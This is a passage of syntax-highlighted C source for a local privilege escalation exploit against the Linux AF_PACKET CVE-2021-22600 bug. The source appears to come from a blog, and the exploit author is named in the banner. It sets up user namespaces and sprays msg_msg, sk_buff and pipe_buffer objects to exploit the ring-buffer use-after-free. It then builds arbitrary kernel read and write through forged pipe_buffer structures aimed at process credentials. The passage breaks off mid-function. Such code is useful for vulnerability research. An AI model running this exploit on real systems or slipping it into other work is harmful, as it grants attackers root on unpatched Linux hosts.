class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">char</span> edit[<span class="hljs-number">0x100</span>];<br>    <span class="hljs-type">int</span> tmp_fd;<br><br>    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);<br>    write(tmp_fd, <span class="hljs-string">&quot;deny&quot;</span>, <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;deny&quot;</span>));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getuid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br><br>    tmp_fd = open(<span class="hljs-string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);<br>    <span class="hljs-built_in">snprintf</span>(edit, <span class="hljs-keyword">sizeof</span>(edit), <span class="hljs-string">&quot;0 %d 1&quot;</span>, getgid());<br>    write(tmp_fd, edit, <span class="hljs-built_in">strlen</span>(edit));<br>    close(tmp_fd);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span>;</span><br><br><span class="hljs-comment">/* read start from len to offset, write start from offset */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">page</span> *<span class="hljs-title">page</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset, len;<br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> private;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> &#123;</span><br>    <span class="hljs-type">long</span> usage;<br>    <span class="hljs-type">uint32_t</span> uid;<br>    <span class="hljs-type">uint32_t</span> gid;<br>    <span class="hljs-type">uint32_t</span> suid;<br>    <span class="hljs-type">uint32_t</span> sgid;<br>    <span class="hljs-type">uint32_t</span> euid;<br>    <span class="hljs-type">uint32_t</span> egid;<br>    <span class="hljs-type">uint32_t</span> fsuid;<br>    <span class="hljs-type">uint32_t</span> fsgid;<br>&#125;;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">get_msg_queue</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">read_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * the msgp should be a pointer to the `struct msgbuf`,</span><br><span class="hljs-comment"> * and the data should be stored in msgbuf.mtext</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">write_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    ((<span class="hljs-keyword">struct</span> msgbuf*)msgp)-&gt;mtype = msgtyp;<br>    <span class="hljs-keyword">return</span> msgsnd(msqid, msgp, msgsz, <span class="hljs-number">0</span>);<br>&#125;<br><br><span class="hljs-comment">/* for MSG_COPY, `msgtyp` means to read no.msgtyp msg_msg on the queue */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">peek_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> msqid, <span class="hljs-type">void</span> *msgp, <span class="hljs-type">size_t</span> msgsz, <span class="hljs-type">long</span> msgtyp)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> msgrcv(msqid, msgp, msgsz, msgtyp, <br>                  MSG_COPY | IPC_NOWAIT | MSG_NOERROR);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SOCKET_NUM 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SK_BUFF_NUM 64</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">init_socket_array</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>])</span><br>&#123;<br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_socket[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to create no.%d socket pair!\n&quot;</span>, i);<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">spray_sk_buff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (write(sk_socket[i][<span class="hljs-number">0</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] failed to spray %d sk_buff for %d socket!&quot;</span>, j, i);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">free_sk_buff</span><span class="hljs-params">(<span class="hljs-type">int</span> sk_socket[SOCKET_NUM][<span class="hljs-number">2</span>], <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            <span class="hljs-keyword">if</span> (read(sk_socket[i][<span class="hljs-number">1</span>], buf, size) &lt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[x] failed to received sk_buff!&quot;</span>);<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">print_banner</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;--------- CVE-2021-22600 Exploitation ---------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(INFO_MSG(<span class="hljs-string">&quot;-------\t\t Author: &quot;</span>) <span class="hljs-string">&quot;arttnba3&quot;</span> INFO_MSG(<span class="hljs-string">&quot; \t-------&quot;</span>));<br>    <span class="hljs-built_in">puts</span>(SUCCESS_MSG(<span class="hljs-string">&quot;--------   Local Privilege Escalation  ---------\n&quot;</span>));<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> &#123;</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_block_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_size;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_frame_nr;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_retire_blk_tov;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_sizeof_priv;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> tp_feature_req_word;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">tpacket_versions</span> &#123;</span><br>    TPACKET_V1,<br>    TPACKET_V2,<br>    TPACKET_V3,<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_RX_RING 5</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_VERSION 10</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PACKET_TX_RING 13</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> VICTIM_OBJ_SZ 1024</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SKBUFF_DATA_SZ (VICTIM_OBJ_SZ - 330)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_BLK_SZ 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_BLK_NR (VICTIM_OBJ_SZ / sizeof(char*))</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_FRAME_SZ TP_BLK_SZ</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> TP_FRAME_NR (TP_BLK_SZ * TP_BLK_NR / TP_FRAME_SZ)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exp_cmd</span> &#123;</span><br>    <span class="hljs-type">size_t</span> cmd;<br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> &#123;</span><br>    CMD_ALLOC_SOCKET = <span class="hljs-number">0</span>,<br>    CMD_SET_VERSION_V2,<br>    CMD_SET_VERSION_V3,<br>    CMD_ALLOC_TX_RING,<br>    CMD_FREE_TX_RING,<br>    CMD_ALLOC_RX_RING,<br>    CMD_FREE_RX_RING,<br>&#125;;<br><br><span class="hljs-type">int</span> p2c_pipe[<span class="hljs-number">2</span>], c2p_pipe[<span class="hljs-number">2</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploitation_child</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exp_cmd</span> <span class="hljs-title">cmd</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tpacket_req</span> <span class="hljs-title">req</span>;</span><br>    <span class="hljs-type">int</span> socket_fd, version;<br>    <span class="hljs-type">int</span> ret = <span class="hljs-number">0</span>;<br><br>    unshare_setup();<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        read(p2c_pipe[<span class="hljs-number">0</span>], &amp;cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br><br>        <span class="hljs-keyword">switch</span> (cmd.cmd) &#123;<br>        <span class="hljs-keyword">case</span> CMD_ALLOC_SOCKET:<br>            log_info(<span class="hljs-string">&quot;[*] Creating packet socket...&quot;</span>);<br><br>            socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);<br>            <span class="hljs-keyword">if</span> (socket_fd &lt; <span class="hljs-number">0</span>) &#123;<br>                log_error(<span class="hljs-string">&quot;[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to create socket&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_SET_VERSION_V2:<br>            log_info(<span class="hljs-string">&quot;[*] Set socket version to TPACKET_V2...&quot;</span>);<br><br>            version = TPACKET_V2;<br>            ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                            &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V2&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_SET_VERSION_V3:<br>            log_info(<span class="hljs-string">&quot;[*] Set socket version to TPACKET_V3...&quot;</span>);<br><br>            version = TPACKET_V3;<br>            ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION, <br>                            &amp;version, <span class="hljs-keyword">sizeof</span>(version));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                log_error(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_VERSION)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to use setsockopt to set TPACKET_V3&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_ALLOC_TX_RING:<br>            log_info(<span class="hljs-string">&quot;[*] Allocating TX ring buffer...&quot;</span>);<br><br>            <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>            req.tp_block_size = TP_BLK_SZ;<br>            req.tp_block_nr = TP_BLK_NR;<br>            req.tp_frame_size = TP_FRAME_SZ;<br>            req.tp_frame_nr = TP_FRAME_NR;<br>        <br>            ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to allocate TX ring buffer&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_FREE_TX_RING:<br>            log_info(<span class="hljs-string">&quot;[*] Freeing TX ring buffer...&quot;</span>);<br><br>            req.tp_block_size = <span class="hljs-number">0x3361626e</span>;<br>            req.tp_block_nr = <span class="hljs-number">0</span>;<br>            req.tp_frame_size = <span class="hljs-number">0x74747261</span>;<br>            req.tp_frame_nr = <span class="hljs-number">0</span>;<br>        <br>            ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_TX_RING)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to free TX ring buffer&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_ALLOC_RX_RING:<br>            log_info(<span class="hljs-string">&quot;[*] Allocating RX ring buffer...&quot;</span>);<br><br>            <span class="hljs-built_in">memset</span>(&amp;req, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(req));<br>            req.tp_block_size = TP_BLK_SZ;<br>            req.tp_block_nr = TP_BLK_NR;<br>            req.tp_frame_size = TP_FRAME_SZ;<br>            req.tp_frame_nr = TP_FRAME_NR;<br>        <br>            ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to allocate RX ring buffer&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> CMD_FREE_RX_RING:<br>            log_info(<span class="hljs-string">&quot;[*] Freeing RX ring buffer...&quot;</span>);<br><br>            req.tp_block_size = <span class="hljs-number">0x3361626e</span>;<br>            req.tp_block_nr = <span class="hljs-number">0</span>;<br>            req.tp_frame_size = <span class="hljs-number">0x74747261</span>;<br>            req.tp_frame_nr = <span class="hljs-number">0</span>;<br>        <br>            ret = setsockopt(socket_fd, SOL_PACKET, PACKET_RX_RING, &amp;req, <span class="hljs-keyword">sizeof</span>(req));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                perror(<span class="hljs-string">&quot;[x] failed at setsockopt(PACKET_RX_RING)&quot;</span>);<br>                err_exit(<span class="hljs-string">&quot;FAILED to free RX ring buffer&quot;</span>);<br>            &#125;<br><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            log_error(<span class="hljs-string">&quot;[x] Unknown command received from parent!&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        write(c2p_pipe[<span class="hljs-number">1</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">send_cmd_to_child</span><span class="hljs-params">(<span class="hljs-type">size_t</span> cmd_nr)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">exp_cmd</span> <span class="hljs-title">cmd</span> =</span> &#123;<br>        .cmd = cmd_nr,<br>    &#125;;<br>    <span class="hljs-type">int</span> ret;<br><br>    write(p2c_pipe[<span class="hljs-number">1</span>], &amp;cmd, <span class="hljs-keyword">sizeof</span>(cmd));<br>    read(c2p_pipe[<span class="hljs-number">0</span>], &amp;ret, <span class="hljs-keyword">sizeof</span>(ret));<br><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_HDR_SZ 0x30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_SZ (VICTIM_OBJ_SZ - MSG_HDR_SZ)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_SPRAY_NR 2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_QUEUE_NR 0x800</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_TAG_BASE 0x200</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MSG_EVIL_SZ (0x1000 - MSG_HDR_SZ + VICTIM_OBJ_SZ - 8)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ATK_QUEUE_IDX 0</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_SPRAY_NR 0x3F0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_FCNTL_SZ (VICTIM_OBJ_SZ / 64 * 0x1000)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_RECLAIM_SZ (512 - MSG_HDR_SZ)</span><br><br><span class="hljs-type">int</span> msg_queue[MSG_QUEUE_NR], garbage_msgs[MSG_QUEUE_NR] = &#123; <span class="hljs-number">0</span> &#125;;<br><span class="hljs-type">int</span> sk_sockets1[SOCKET_NUM][<span class="hljs-number">2</span>], sk_sockets2[SOCKET_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> pipe_fd[PIPE_SPRAY_NR][<span class="hljs-number">2</span>], uaf_pipe[<span class="hljs-number">2</span>], orig_idx = <span class="hljs-number">-1</span>, victim_idx = <span class="hljs-number">-1</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">leak_pipe_buf</span>, *<span class="hljs-title">fake_pipe_buf</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">pipe_ops</span>;</span><br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x2000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (read_msg(msg_queue[ATK_QUEUE_IDX], msg_buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    fake_pipe_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;msg_buf[<span class="hljs-number">511</span>];<br>    fake_pipe_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_pipe_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_pipe_buf-&gt;ops = pipe_ops;<br><br>    <span class="hljs-keyword">if</span> (write_msg(msg_queue[ATK_QUEUE_IDX], msg_buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg to overwrite pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (read(uaf_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xff0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to read from pipe&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to read from evil pipe!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_pipe_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;msg_buf[<span class="hljs-number">516</span>];<br><br>    <span class="hljs-keyword">if</span> (read_msg(msg_queue[ATK_QUEUE_IDX], msg_buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to read msg_msg and msg_msgseg!&quot;</span>);<br>    &#125;<br><br>    fake_pipe_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_pipe_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_pipe_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_pipe_buf-&gt;ops = pipe_ops;<br><br>    <span class="hljs-keyword">if</span> (write_msg(msg_queue[ATK_QUEUE_IDX], msg_buf, MSG_EVIL_SZ, <span class="hljs-number">0x400</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to allocate msg_msg to overwrite pipe_buffer!&quot;</span>);<br>    &#125;<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    <span class="hljs-keyword">if</span>(write(uaf_pipe[<span class="hljs-number">1</span>], buf, len) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to write into pipe&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to write into evil pipe!&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploitation</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x2000</span>], kernel_leak, current_pcb_page, *comm_addr;<br>    <span class="hljs-type">char</span> *noise_pages;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rlimit</span> <span class="hljs-title">rl</span>;</span><br>    <span class="hljs-type">int</span> found = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">uint32_t</span> uid, gid;<br>    <span class="hljs-type">uint64_t</span> cred_kaddr, cred_kpage_addr;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">cred_data</span>;</span><br>    <span class="hljs-type">char</span> cred_data_buf[<span class="hljs-number">0x1000</span>];<br><br>    <span class="hljs-built_in">memset</span>(buf, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(buf));<br><br>    print_banner();<br><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    rl.rlim_cur = <span class="hljs-number">4096</span>;<br>    rl.rlim_max = <span class="hljs-number">4096</span>;<br>    <span class="hljs-keyword">if</span> (setrlimit(RLIMIT_NOFILE, &amp;rl) == <span class="hljs-number">-1</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] setrlimit&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to expand file descriptor&#x27;s limit!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Creating child process to user packet socket...&quot;</span>);<br><br>    <span class="hljs-keyword">if</span> (pipe(p2c_pipe) &lt; <span class="hljs-number">0</span> || pipe(c2p_pipe) &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to create pipe&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create pipe for communication!&quot;</span>);<br>    &#125;<br><br>    ret = fork();<br>    <span class="hljs-keyword">if</span> (!ret) &#123;<br>        exploitation_child();<br>        <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to fork out child process&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to create child process for exploit!&quot;</span>);<br>    &#125;<br><br>    send_cmd_to_child(CMD_ALLOC_SOCKET);<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing msg_queue...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NR; i++) &#123;<br>        msg_queue[i] = get_msg_queue();<br>        <span class="hljs-keyword">if</span> (msg_queue[i] &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to get %d msg_queue\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing mmap area for clearing noisy pages later...&quot;</span>);<br>    noise_pages = mmap(<span class="hljs-literal">NULL</span>, TP_BLK_NR * <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (noise_pages == MAP_FAILED) &#123;<br>        perror(<span class="hljs-string">&quot;[x] Unable to create mmap region&quot;</span>);<br>        err_exit(<span class="hljs-string">&quot;FAILED to do the mmap!&quot;</span>);<br>    &#125;<br><br>    log_info(<span class="hljs-string">&quot;[*] Preparing pipe...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_SPRAY_NR; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to create %d pipe\n&quot;</span>, i);<br>            err_exit(<span class="hljs-string">&quot;FAILED to prepare pipe!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">0x100</span>; j++) &#123;<br>            <span class="hljs-comment">/* identifier */</span><br>            write(pipe_fd[i][<span class="hljs-number">1</span>], &amp;i, <span class="hljs-keyword">sizeof</span>(i));<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (fcntl(pipe_fd[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            perror(<span class="hljs-string">&quot;[x] Failed to do fcntl on pipe&quot;</span>);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Unable to shrink %d pipe_buffer\n&quot;</span>, 